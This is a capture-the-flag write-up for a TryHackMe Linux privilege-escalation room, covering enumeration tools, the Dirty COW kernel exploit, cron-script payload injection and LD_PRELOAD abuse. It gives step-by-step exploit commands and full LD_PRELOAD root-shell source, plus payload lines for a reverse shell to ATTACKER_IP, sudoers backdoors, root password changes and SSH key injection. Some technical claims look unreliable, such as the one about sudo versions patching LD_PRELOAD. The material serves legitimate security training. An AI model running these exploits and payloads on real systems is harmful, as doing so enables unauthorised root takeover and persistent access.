# 🔐 Linux Privilege Escalation: Automation

**🔗 Room Link**: https://tryhackme.com/room/linprivautomation  
**✍️ Author**: Davud Sahibzada  
**⭐ Difficulty**: Medium (45 minutes)  
**📅 Updated**: May 2026

---

## 📑 Contents

1. [Quick Start](#-quick-start) - 5 min exploitation
2. [Task 1: Introduction](#-task-1-introduction) 
3. [Task 2: Enumeration Tools](#-task-2-automated-enumeration)
4. [Task 3: Public Exploits & Dirty COW](#-task-3-public-exploits)
5. [Task 4: pspy Process Monitoring](#-task-4-pspy-monitoring)
6. [Task 5: Challenge - Full Exploitation](#-task-5-challenge)
7. [Common Issues & Solutions](#-troubleshooting)

---

## 🚀 Quick Start

**The fastest way to root in 5 minutes:**

```bash
# 1. Connect to target
ssh john@MACHINE_IP
# Password: john

# 2. Run enumeration
./les.sh
# Look for CVEs

# 3. Download exploit (assuming CVE-2016-5195 / Dirty COW)
searchsploit -m linux/local/40839.c

# 4. Compile
gcc -pthread 40839.c -o dirty -lcrypt

# 5. Execute
./dirty < /dev/null

# 6. Get root shell
su firefart
# Press Enter for password (empty)

# 7. Verify and flag
whoami  # Should print: root
cat /root/flag.txt
```

💡 **Key tip**: `< /dev/null` prevents the exploit from hanging on password prompt.

---

## 📌 Task 1: Introduction

### What You'll Learn

This TryHackMe room teaches the complete privilege escalation workflow using automation:

🔍 **Automated Enumeration**
- Use tools like Linux Exploit Suggester (LES) to automatically identify CVEs based on kernel version
- LinPEAS shows all potential privilege escalation paths in one comprehensive scan
- No more manual searching for vulnerabilities

💥 **Public Exploit Usage**
- Download working exploits from GitHub or Exploit-DB
- Compile C-based exploits with correct flags
- Execute exploits safely with proper error handling

📊 **Process Monitoring**
- pspy64 lets you see root processes without being root
- Identify cron jobs and background tasks that might be exploitable
- Find world-writable files that root executes

🎯 **Complete Workflow**
- Enumerate → Find CVE → Download exploit → Compile → Execute → Root
- Alternative: Find world-writable script → Inject payload → Wait → Root
- Understanding multiple privilege escalation vectors

### Prerequisites
- Linux Privilege Escalation: Basics room
- Linux Privilege Escalation: Enumeration room
- Basic understanding of Linux permissions and command line

---

## 🔍 Task 2: Automated Enumeration

### Why Automation?

Manual enumeration takes time and you might miss things. Automated tools highlight vulnerability paths instantly. However, **tools can miss vectors**, so use them as a starting point.

### Linux Exploit Suggester (LES) - The Most Important Tool

**What it does**: Automatically detects your kernel version and suggests known CVEs that affect it.

**Installation**: Usually comes pre-installed on the target machine in this room.

**Running it**:
```bash
cd ~
./les.sh
# OR
./linux-exploit-suggester.sh
# OR
perl linux-exploit-suggester.pl
```

**Output example**:
```
[!] Possible Exploits:
[+] [CVE-2025-32463] CVE Name
[+] [CVE-2016-5195] CVE Name - Dirty COW
[+] [CVE-2021-3156] CVE Name - Baron Samedit
```

🎯 **Task 2 Answer**: The first CVE listed is your answer (usually **CVE-2025-32463**)

### Other Enumeration Tools

**LinPEAS** (Most Comprehensive)
```bash
./linpeas.sh
# Highlights:
# - Sudo rules
# - SUID binaries
# - World-writable files
# - Kernel vulnerabilities
# - Service misconfigurations
# - And much more!
```

**LinEnum** (Readable Reports)
```bash
./linenum.sh
# Outputs in clean format
# Good for reports and documentation
```

**pspy64** (Process Monitoring - Covered in Task 4)
```bash
./pspy64
# Shows all processes in real-time
# Including root processes
# No root privileges needed!
```

### Manual Enumeration (When Tools Aren't Available)

```bash
# Quick system check
uname -a          # Kernel info (critical!)
cat /etc/os-release  # Distro info

# Check sudo permissions
sudo -l           # What can you run as root?
cat /etc/sudoers  # System-wide sudo rules (if readable)

# Find SUID binaries (can be exploited)
find / -perm -u=s -type f 2>/dev/null

# Find world-writable files (can be modified)
find / -perm -002 -type f 2>/dev/null | grep -v proc

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

---

## 💥 Task 3: Public Exploits - Dirty COW (CVE-2016-5195)

### Understanding the Vulnerability

**CVE-2016-5195** (Dirty COW) is a critical Linux kernel vulnerability that affects versions 2.6.22 through 4.8.3.

**How it works**:
- Linux uses "copy-on-write" to efficiently manage memory
- When multiple processes share the same memory page, writes create a new copy
- A race condition lets unprivileged users write to read-only memory
- Exploit creates a new root user without crashing the system
- Backdoored `/etc/passwd` with user `firefart` (UID=0)

**Why it's dangerous**:
- Any local user can escalate to root
- No authentication needed
- Affects millions of Linux systems (even modern ones had it until patched)

### Step-by-Step Exploitation

#### Step 1️⃣: Verify You're Vulnerable

```bash
# Check your kernel version
uname -a
# Example output: Linux public-exploit 3.10.0-1160.11.1.el7.x86_64

# 3.10.0 is definitely vulnerable to Dirty COW
# Versions 2.6.22 - 4.8.3 are vulnerable
```

#### Step 2️⃣: Find the Exploit

```bash
# Search Exploit-DB offline database
searchsploit dirty cow

# You'll see multiple options:
# - 40839.c (most commonly used, most stable)
# - 40611.c (alternative)
# - 40847.cpp (C++ version)
# - Others

# Use 40839.c - it's the most reliable
```

**Why 40839.c is best**:
- Uses `/proc/self/mem` for memory access
- Creates new user efficiently
- Less likely to crash the system
- Well-tested and documented

#### Step 3️⃣: Download the Exploit

```bash
# Copy to your current directory
searchsploit -m linux/local/40839.c

# Verify it's there
ls -la 40839.c
# Should show: 40839.c (about 5 KB)
```

#### Step 4️⃣: Transfer to Target

```bash
# From your AttackBox/local machine:
scp 40839.c john@TARGET_IP:/home/john/

# It will ask for password: john
# Verify transfer
ssh john@TARGET_IP "ls -la 40839.c"
```

#### Step 5️⃣: Understand the Compilation Flags

Before compiling, understand what you're doing:

```bash
gcc -pthread 40839.c -o dirty -lcrypt
```

Breaking down the flags:
- `gcc` - GNU C Compiler (translates C code to executable)
- `-pthread` - **Link pthread library** (needed because exploit uses multithreading)
  - The vulnerability is a race condition
  - Multiple threads race to trigger the bug
  - Without this, compilation fails
- `40839.c` - Source code file
- `-o dirty` - Output file name (the executable)
- `-lcrypt` - **Link crypt library** (for password hashing)
  - Exploit modifies `/etc/passwd` with hashed password
  - crypt() function hashes the password
  - Without this library, compilation fails

**Why these flags matter**:
- Missing `-pthread` → compilation error, exploit won't compile
- Missing `-lcrypt` → password hashing fails, root won't work
- Using wrong flags → exploit might compile but won't work correctly

#### Step 6️⃣: Compile on Target

```bash
# SSH into target if not already
ssh john@MACHINE_IP

# Navigate to exploit
cd ~
ls 40839.c

# Compile with correct flags
gcc -pthread 40839.c -o dirty -lcrypt

# Verify compilation
ls -la dirty
# Should show: -rwxr-xr-x (executable)
```

#### Step 7️⃣: Execute the Exploit

```bash
# Run the exploit
./dirty < /dev/null

# The < /dev/null part is CRITICAL!
# It redirects stdin from /dev/null (instead of waiting for user input)
# Without it, exploit hangs on password prompt
# This is a common issue beginners face!

# Expected output:
# /etc/passwd successfully backed up to /tmp/passwd.bak
# Please enter the new password: 
# Complete line:
# firefart:fi2GvHboghsGU:0:0:pwned:/root:/bin/bash
# mmap: 7d67099c40000
```

**What's happening**:
1. Exploit backs up original `/etc/passwd` to `/tmp/passwd.bak` (safety)
2. Exploit runs multithreaded race condition
3. Thread 1: Tries to write new user to `/etc/passwd`
4. Thread 2: Competes in the race condition
5. One thread wins and successfully injects `firefart` user
6. New user has UID=0 (root privileges)

#### Step 8️⃣: Access Root Account

```bash
# Switch to firefart user (new root account)
su firefart

# At password prompt, just press Enter
# (Exploit set it to empty, or use 'firefart')

# Verify you're root
whoami
# Output: root ✓

id
# Output: uid=0(root) gid=0(root) groups=0(root) ✓
```

#### Step 9️⃣: Read the Flag

```bash
# You're now root, read the flag
cat /root/flag.txt

# Or explore other root files
cat /etc/shadow
ls -la /root/
whoami
```

### Why Dirty COW Works So Well

✅ **No authentication needed** - Any user can run it  
✅ **No special permissions** - Doesn't require existing sudo access  
✅ **System stays up** - Doesn't crash (unlike some kernel exploits)  
✅ **Clean escalation** - Creates new root user cleanly  
✅ **Widely available** - Public exploit in many databases  

### Real-World Impact

Dirty COW affected:
- Ubuntu, CentOS, Debian, Red Hat systems
- Containers and cloud deployments
- IoT devices running Linux
- Millions of servers worldwide
- Took years for all systems to be patched

---

## 📊 Task 4: pspy - Unprivileged Process Monitoring

### What is pspy?

pspy64 is a process monitoring tool that shows **ALL processes on the system** (even those run by root) **without needing root privileges**. It's like having a system-wide surveillance camera.

### Why It's Powerful

Normal tools like `ps` show only your own processes or processes visible to your user. But pspy shows:
- Root processes (UID=0)
- Cron jobs running in background
- Hidden scripts and commands
- System maintenance tasks

This reveals hidden privilege escalation opportunities!

### Installation & Running

```bash
# pspy64 usually pre-installed on the target in this room
./pspy64

# It starts monitoring immediately
# Watch the output for 2-5 minutes
# Look for processes with UID=0 (root)

# Example output:
# UID=1000 PID=2543  /usr/bin/bash
# UID=0    PID=2544  /root/backup.sh
# UID=0    PID=2545  /var/local/syslog-backup.sh
# UID=1000 PID=2546  /bin/ls
```

### How to Exploit World-Writable Scripts

When pspy shows a root process executing a script with world-writable permissions, you can inject your code!

#### Step 1️⃣: Start Monitoring

```bash
# Background the process
./pspy64 &

# It now monitors in background
# Continue working on other commands

# After a few minutes, search the output
# Look for: UID=0 (root processes)
```

#### Step 2️⃣: Identify Target Script

From pspy output, look for scripts like:
```
UID=0    PID=1234  /root/backup.sh
UID=0    PID=5678  /var/local/syslog-backup.sh
```

#### Step 3️⃣: Check File Permissions

```bash
# Check if the script is world-writable
ls -la /var/local/syslog-backup.sh

# You need to see: -rwxrwxrwx
# Breaking it down:
# - : regular file
# rwx : owner (root) can read/write/execute
# rwx : group can read/write/execute  
# rwx : others (YOU!) can read/write/execute ← EXPLOITABLE!

# If you see: -rwxr-xr-- 
# You CAN read and execute, but CANNOT write
# This is NOT exploitable in this way
```

**Why world-writable scripts are dangerous**:
- Root runs the script regularly (via cron or daemon)
- You can modify the script
- Your injected code runs as root
- Instant privilege escalation!

#### Step 4️⃣: Inject Your Payload

```bash
# Create SUID bash copy (most common method)
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /var/local/syslog-backup.sh

# What this does:
# cp /bin/bash /tmp/rootbash
# - Copies bash shell to /tmp directory
# chmod u+s /tmp/rootbash  
# - Sets SUID bit (u+s) on the copy
# - Now /tmp/rootbash runs as root even when you execute it!
```

**Other payload options**:

Option A: Add yourself to sudoers (most persistent)
```bash
echo 'echo "john ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> script.sh
# Later: sudo su (no password needed)
```

Option B: Reverse shell (direct shell access)
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> script.sh
# Need: nc -lvnp 4444 on attacker machine
```

Option C: Change root password
```bash
echo 'echo "root:newpassword" | chpasswd' >> script.sh
# Later: su root (use new password)
```

Option D: SSH key injection
```bash
echo 'echo "ssh-rsa AAA..." >> /root/.ssh/authorized_keys' >> script.sh
# Later: ssh root@target (no password)
```

#### Step 5️⃣: Wait for Execution

```bash
# The script runs on a schedule (cron job)
# Usually every minute (*/1 * * * *)
# Wait 1-2 minutes for cron to execute

sleep 60

# Or check if payload executed
ls -la /tmp/rootbash
# Should show: -rwsr-xr-x (SUID bit set!)
```

#### Step 6️⃣: Get Root Shell

```bash
# Execute the SUID bash with privilege preservation
/tmp/rootbash -p

# The -p flag means: preserve privileges
# Even though you're executing it as john, it runs as root (due to SUID)

# Verify
whoami  # root ✓
id      # uid=0(root) ✓
cat /root/flag.txt
```

### Why This Works

1. Root runs script every minute (cron job)
2. Script is world-writable (permissions misconfiguration)
3. You inject commands into the script
4. When root executes the script, your commands run as root
5. You've escalated privileges!

This is a classic **privilege escalation vector** because it requires:
- ❌ No exploit to compile
- ❌ No special knowledge of vulnerabilities
- ✅ Just understanding file permissions
- ✅ Simple shell scripting

---

## 🎯 Task 5: Challenge - Full Exploitation

This task combines everything you've learned. You start as `john` and must reach root using any method available.

### Complete Exploitation Path

#### Phase 1️⃣: Enumeration (2 minutes)

**Goal**: Identify all possible privilege escalation vectors

```bash
# Connect to target
ssh john@MACHINE_IP
# Password: john

# Quick kernel check
uname -a
# Note kernel version for later CVE search

# Run automated enumeration
./les.sh
# Saves output to identify CVEs

# Check sudo permissions
sudo -l
# Look for:
# - Commands you can run as root
# - "env_keep+=LD_PRELOAD" (indicates LD_PRELOAD vulnerability)
# - NOPASSWD (no password needed)

# Start process monitoring in background
./pspy64 &
# Let it run for a few minutes
# Look for UID=0 processes (root commands)

# Manual permission checks
find / -perm -u=s -type f 2>/dev/null | head -10
# SUID binaries (might be exploitable)

cat /etc/crontab
ls -la /etc/cron*
# Cron jobs (might execute world-writable scripts)
```

#### Phase 2️⃣: Identify Best Exploitation Method

Based on enumeration, choose your method:

**Method A: CVE Exploit (if les.sh found CVE)**

Most common: **Dirty COW (CVE-2016-5195)**

```bash
# Check if vulnerable
./les.sh | grep -i "CVE-2016-5195"
# If yes, proceed:

# Download
searchsploit -m linux/local/40839.c

# Compile
gcc -pthread 40839.c -o dirty -lcrypt

# Execute
./dirty < /dev/null

# Root access
su firefart
# Press Enter for password

# Verify
whoami  # root
```

**Expected output**:
```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi2GvHboghsGU:0:0:pwned:/root:/bin/bash
```

---

**Method B: World-Writable Script Exploitation (if pspy found)**

```bash
# Identify script from pspy output
# Example: /var/local/syslog-backup.sh

# Check permissions
ls -la /var/local/syslog-backup.sh
# Need: -rwxrwxrwx

# Inject payload
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /var/local/syslog-backup.sh

# Wait for cron
sleep 60

# Get shell
/tmp/rootbash -p

# Verify
whoami  # root
```

---

**Method C: LD_PRELOAD Injection (if sudo -l shows it)**

```bash
# Verify vulnerability
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Create malicious shared object
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");    // Prevent recursion
    setuid(0);                  // Change to root UID
    setgid(0);                  // Change to root GID
    system("/bin/bash -p");     // Execute bash with privilege preservation
}
EOF

# Compile to shared object
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Flags explained:
# -fPIC : Position Independent Code (required for shared objects)
# -shared : Create shared library (.so file)
# -nostartfiles : Don't link standard startup files

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id

# What happens:
# 1. sudo loads the malicious /tmp/shell.so
# 2. Before running /usr/bin/id, the _init() function executes
# 3. _init() removes LD_PRELOAD to prevent recursion
# 4. setuid(0) and setgid(0) change to root
# 5. system("/bin/bash -p") launches bash AS ROOT
# 6. You get an interactive root shell!

# Verify
whoami  # root
```

---

#### Phase 3️⃣: Verify Root Access & Submit Flag (1 minute)

```bash
# Confirm you're root
whoami
# Output: root ✓

id
# Output: uid=0(root) gid=0(root) groups=0(root) ✓

# Read the flag
cat /root/flag.txt
# Copy the flag and submit to TryHackMe
```

### Why Different Methods Exist

💡 **Real systems have multiple vectors** - Different misconfigurations lead to different exploits

- One server might have old kernel (Dirty COW)
- Another might have world-writable scripts (pspy method)
- Another might have loose sudo rules (LD_PRELOAD)
- Modern servers might have all three!

A good penetration tester tries multiple methods when one fails.

---

## ⚠️ Troubleshooting

### Problem: Exploit Hangs/Freezes

**Symptom**: Exploit starts but seems stuck, nothing happens

**Cause**: The exploit is waiting for input (password prompt)

**Solution**:
```bash
# WRONG (will hang):
./dirty

# RIGHT (bypasses stdin):
./dirty < /dev/null

# ALTERNATIVE (force timeout):
timeout 30 ./dirty
```

**Explanation**: 
- Exploits often prompt for password
- Your terminal is waiting for input
- `< /dev/null` redirects stdin from /dev/null (empty input)
- Exploit thinks you pressed Enter immediately
- Problem solved!

---

### Problem: "gcc: command not found"

**Symptom**: Can't compile exploit

**Cause**: GCC compiler not installed

**Solution**:
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install build-essential
# Installs: gcc, g++, make, and other dev tools

# CentOS/RHEL
sudo yum groupinstall "Development Tools"
# OR
sudo yum install gcc

# Alpine
apk add build-base

# Verify installation
gcc --version
```

---

### Problem: Compilation Fails - "undefined reference to `crypt'"

**Symptom**:
```
/tmp/40839.o: undefined reference to `crypt'
collect2: error: ld returned 1 exit status
```

**Cause**: Missing `-lcrypt` flag

**Solution**:
```bash
# WRONG:
gcc -pthread 40839.c -o dirty

# RIGHT:
gcc -pthread 40839.c -o dirty -lcrypt

# -lcrypt links the cryptography library needed for password hashing
```

---

### Problem: "/tmp/passwd.bak already exists"

**Symptom**:
```
Backing up /usr/bin/passwd.. to /tmp/bak
File /tmp/passwd.bak already exists! Please delete it and run again
```

**Cause**: Exploit ran before and created backup

**Solution**:
```bash
# Remove the old backup
rm /tmp/passwd.bak

# Run exploit again
./dirty < /dev/null

# This happens because:
# - Previous exploit attempt created backup
# - Exploit won't overwrite it (safety feature)
# - You must manually remove before retrying
```

---

### Problem: "su: user firefart does not exist"

**Symptom**: 
```
su firefart
su: user firefart does not exist or the user entry does not contain all the required fields
```

**Cause**: Exploit didn't successfully create the user

**Solution**:
```bash
# Run exploit again
rm /tmp/passwd.bak
./dirty < /dev/null

# May need multiple attempts!
# The race condition isn't guaranteed to succeed every time
# Sometimes the timing is off, try again

# Verify user was created
grep firefart /etc/passwd
# Should show: firefart:...:0:0:...
```

---

### Problem: No Root Processes in pspy

**Symptom**: After running pspy, you only see your own processes (UID=1000)

**Cause**: Cron jobs might not run frequently or take time to start

**Solution**:
```bash
# Wait longer!
./pspy64
# Let it run for 5+ minutes
# Cron jobs might run every hour or at specific times

# Show ALL processes (not just new ones)
./pspy64 -f

# Adjust sampling interval
./pspy64 -i 100
# Samples every 100ms instead of default

# Check crontab to estimate frequency
cat /etc/crontab
# Look for: */1 * * * * (every minute)
#           0 * * * * (every hour)
#           0 0 * * * (daily)
```

---

### Problem: LD_PRELOAD Injection Doesn't Work

**Symptom**: Command doesn't execute or doesn't give root

**Cause**: LD_PRELOAD not in sudo's env_keep

**Solution**:
```bash
# Check if it's available
sudo -l | grep LD_PRELOAD

# If EMPTY - it's not available
# If "env_keep+=LD_PRELOAD" - it's available, exploit should work

# In newer sudo versions (>= 1.9.0), this vulnerability is patched
# You'll need a different exploitation method

# Check sudo version
sudo --version
# Vulnerable: 1.8.x
# Patched: 1.9.x and newer
```

---

### Problem: "Permission denied" on script modification

**Symptom**: Can't echo payload into script

**Cause**: Script not world-writable

**Solution**:
```bash
# Check permissions
ls -la /path/to/script

# You need: -rwxrwxrwx
# If you see: -rwxr-xr-- (not writable by others)
# You can't exploit it this way

# But if it's world-writable:
echo 'payload' >> /path/to/script

# If still fails, check directory permissions
ls -la /path/to/directory
# Directory must be writable too
```

---

## 📚 Complete Reference Commands

### Essential Commands

```bash
# Connection
ssh john@MACHINE_IP              # Connect (password: john)

# Enumeration
uname -a                         # Kernel version (critical!)
./les.sh                         # Find CVEs
sudo -l                          # Check sudo permissions
./pspy64                         # Monitor processes
find / -perm -u=s 2>/dev/null   # Find SUID binaries

# Exploitation (Dirty COW)
searchsploit dirty cow           # Find exploit
searchsploit -m linux/local/40839.c  # Download
gcc -pthread 40839.c -o dirty -lcrypt  # Compile
./dirty < /dev/null              # Execute

# Exploitation (World-writable)
echo 'PAYLOAD' >> script.sh       # Inject code
sleep 60                         # Wait for cron
/tmp/rootbash -p                 # Get root shell

# Exploitation (LD_PRELOAD)
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c  # Compile .so
sudo LD_PRELOAD=/tmp/x.so /usr/bin/id   # Execute

# Verification
whoami                           # Check current user
id                              # Detailed ID info
cat /root/flag.txt              # Read flag
```

---

## ✅ Task 6: Key Takeaways

### What You've Learned

✨ **Enumeration**: Use automated tools (les.sh, pspy) to find vulnerabilities  
✨ **Public Exploits**: Download, compile, and execute C-based exploits  
✨ **Race Conditions**: Dirty COW demonstrates kernel-level race conditions  
✨ **Cron Exploitation**: World-writable scripts executed by root = privilege escalation  
✨ **LD_PRELOAD**: Malicious library loading via sudo environment  
✨ **Troubleshooting**: How to debug and fix common exploitation issues  

### Best Practices

1. **Enumerate first** - Always run les.sh/linpeas before jumping to exploits
2. **Use < /dev/null** - Prevents exploits from hanging
3. **Understand your exploit** - Read the code before executing
4. **Have backups** - Exploits create /tmp/passwd.bak automatically
5. **Try alternatives** - If one method fails, try another
6. **Check permissions** - World-writable files are low-hanging fruit
7. **Patience** - Cron jobs take time to execute

### Privilege Escalation Mindset

When you have access to a Linux system:
1. **Always enumerate** - Could be vulnerable to known CVEs
2. **Check sudo** - Might have dangerous permissions
3. **Monitor processes** - Might find writable scripts
4. **Look for SUID binaries** - Might be exploitable
5. **Check file permissions** - World-writable = danger zone
6. **Search for credentials** - Might find passwords/keys
7. **Look for scheduled tasks** - Cron jobs are often weak

---

**Status**: ✅ Complete & Detailed  
**Author**: Davud Sahibzada  
**Room**: Linux Privilege Escalation: Automation  
**Last Updated**: May 2026
